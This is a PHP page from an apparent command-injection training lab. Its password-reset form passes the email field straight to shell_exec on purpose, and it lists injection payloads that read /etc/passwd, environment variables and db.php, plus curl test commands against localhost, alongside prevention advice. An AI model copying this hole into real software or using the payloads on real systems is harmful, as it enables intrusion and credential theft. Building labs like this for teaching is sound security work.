<?php
// Command Injection Vulnerability Lab
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Reset - Command Injection Lab</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>🔑 Password Reset</h1>
            <h2>Command Injection Vulnerability Lab</h2>
            
            <div class="warning">
                ⚠️ <strong>Command Injection Vulnerability</strong><br>
                This page demonstrates OS command injection vulnerabilities.
            </div>

            <form action="reset-password.php" method="POST">
                <div class="form-group">
                    <label for="email">Email Address:</label>
                    <input type="text" id="email" name="email" placeholder="user@example.com" required>
                    <small>We'll send a password reset link to this email</small>
                </div>
                
                <button type="submit" class="btn">Send Reset Link</button>
            </form>

            <div style="margin-top: 20px;">
                <a href="index.php" class="btn btn-secondary">← Back to Login</a>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $email = $_POST['email'] ?? '';
                
                echo '<div class="response-section">';
                echo '<h3>📧 Processing Password Reset...</h3>';
                
                // VULNERABILITY: Command Injection
                // The email is passed directly to shell command without sanitization
                // This allows attackers to execute arbitrary commands
                
                // Simulate sending email using a system command
                $command = "echo 'Sending password reset to: $email'";
                
                echo '<div class="command-display">';
                echo '<strong>Executing Command:</strong><br>';
                echo '<code>' . htmlspecialchars($command) . '</code>';
                echo '</div>';
                
                // Execute the command (VULNERABLE!)
                $output = shell_exec($command . ' 2>&1');
                
                echo '<div class="output-display">';
                echo '<strong>Command Output:</strong><br>';
                echo '<pre>' . htmlspecialchars($output) . '</pre>';
                echo '</div>';
                
                // Show success message
                echo '<div class="success-box" style="margin-top: 15px;">';
                echo '✅ If the email exists in our system, a reset link has been sent.';
                echo '</div>';
                
                echo '</div>';
            }
            ?>

            <div class="hints">
                <h3>🎯 Command Injection Exploitation</h3>
                <details open>
                    <summary>💡 How to Exploit</summary>
                    <div class="exploit-examples">
                        <p><strong>The vulnerability:</strong> User input is passed directly to shell_exec() without sanitization.</p>
                        
                        <h4>Basic Payloads:</h4>
                        <div class="code-block">
# List files in current directory
user@example.com; ls -la

# Show current user
user@example.com; whoami

# Show current directory
user@example.com; pwd

# Read /etc/passwd
user@example.com; cat /etc/passwd

# Network information
user@example.com; ifconfig

# Environment variables
user@example.com; env
                        </div>

                        <h4>Advanced Payloads:</h4>
                        <div class="code-block">
# Using && operator
user@example.com && cat /etc/hosts

# Using | pipe
user@example.com | ls /var/www/html

# Using backticks
user@example.com `whoami`

# Command substitution
user@example.com $(ls)

# Read sensitive files
user@example.com; cat /var/www/html/db.php
                        </div>

                        <h4>Testing with curl:</h4>
                        <div class="code-block">
# Basic command injection
curl -X POST http://localhost:8080/reset-password.php \
  -d "email=test@test.com; ls -la"

# Read files
curl -X POST http://localhost:8080/reset-password.php \
  -d "email=test@test.com; cat /etc/passwd"
                        </div>
                    </div>
                </details>

                <details>
                    <summary>🛡️ How to Prevent</summary>
                    <div class="exploit-examples">
                        <ul>
                            <li>Never pass user input directly to shell commands</li>
                            <li>Use built-in functions instead of shell commands</li>
                            <li>If shell commands are necessary, use escapeshellarg() and escapeshellcmd()</li>
                            <li>Implement input validation and whitelist allowed characters</li>
                            <li>Use parameterized functions or libraries</li>
                        </ul>
                        <div class="code-block">
// SECURE Example:
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if ($email) {
    // Use PHP mail() function instead of shell commands
    mail($email, "Password Reset", "Reset link...");
}
                        </div>
                    </div>
                </details>
            </div>
        </div>
    </div>

    <style>
        .additional-links {
            margin-top: 15px;
            text-align: center;
            padding: 15px 0;
            border-top: 1px solid #ddd;
            border-bottom: 1px solid #ddd;
        }
        
        .additional-links a {
            display: inline-block;
            margin: 5px 10px;
            color: #667eea;
            text-decoration: none;
            font-weight: 500;
        }
        
        .additional-links a:hover {
            text-decoration: underline;
        }
        
        .response-section {
            margin-top: 20px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 5px;
            border-left: 4px solid #667eea;
        }
        
        .command-display {
            background: #fff3cd;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #ffc107;
        }
        
        .command-display code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 10px;
            display: block;
            border-radius: 3px;
            margin-top: 5px;
            font-family: 'Courier New', monospace;
        }
        
        .output-display {
            background: #d4edda;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #28a745;
        }
        
        .output-display pre {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 10px;
            border-radius: 3px;
            margin-top: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        
        .code-block {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        
        .exploit-examples {
            background: #fff;
            padding: 15px;
            border-radius: 5px;
            margin-top: 10px;
        }
        
        .exploit-examples h4 {
            color: #667eea;
            margin-top: 15px;
            margin-bottom: 10px;
        }
    </style>
</body>
</html>